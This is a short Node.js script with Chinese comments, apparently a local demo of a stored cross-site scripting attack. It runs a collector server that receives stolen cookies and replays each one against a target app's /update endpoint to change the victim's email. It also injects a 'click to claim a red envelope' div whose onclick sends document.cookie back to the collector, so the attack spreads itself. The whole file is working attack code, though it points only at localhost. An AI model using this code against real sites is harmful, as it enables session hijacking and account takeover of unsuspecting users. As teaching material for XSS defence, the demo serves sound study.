const http = require("http");
const querystring = require("querystring");

// xss cross site scripting 跨站脚本攻击
http.createServer((req, res) => {
  console.log('receive req ', req.url);
  if (req.url.includes('/xss')) {
    const cookie = req.url.replace('/xss?cookie=', '');
    console.log('xss 攻击成功，获取到用户的cookie:', cookie);
    if (!cookie) {
      res.end('xss get cookie is null');
      return;
    }
    // 修改用户的邮箱
    var request = http.request({
      hostname: '127.0.0.1',
      port: 8082,
      path: '/update',
      method: 'POST',
      headers: {
        cookie,
      },
    });
    request.write(querystring.stringify({
      username: '<div onclick="fetch(`http://127.0.0.1:8083/xss?cookie=${document.cookie}`)">点我领取红包</div>',
      email: 'xss@123.com',
    }));
    request.end();
    console.log('修改用户邮箱成功');
  }
  
}).listen(8083);

